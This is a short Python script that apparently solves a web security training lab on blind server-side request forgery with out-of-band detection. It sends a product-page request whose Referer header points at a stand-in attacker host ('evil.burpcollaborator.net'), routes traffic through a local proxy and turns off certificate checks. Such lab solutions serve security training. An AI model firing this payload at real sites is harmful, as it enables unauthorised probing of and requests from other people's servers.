import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()

    print("[+] Lab: Blind SSRF with out-of-band detection")
    print("""[+] This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.
    To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.""")

    # SEND REQUEST WITH 'HACKED' REFERER
    product_url = url + '/product?productId=1'
    headers = {
        'Referer' : 'http://evil.burpcollaborator.net'
    }
    r = requests.get(product_url, headers=headers, verify=False, proxies=proxies)
    if r.status_code == 200:
        print("[+] Should have worked...")
        sys.exit(-1)
    print("[-] Try again!")
    sys.exit(-1)

if __name__ == "__main__":
    main()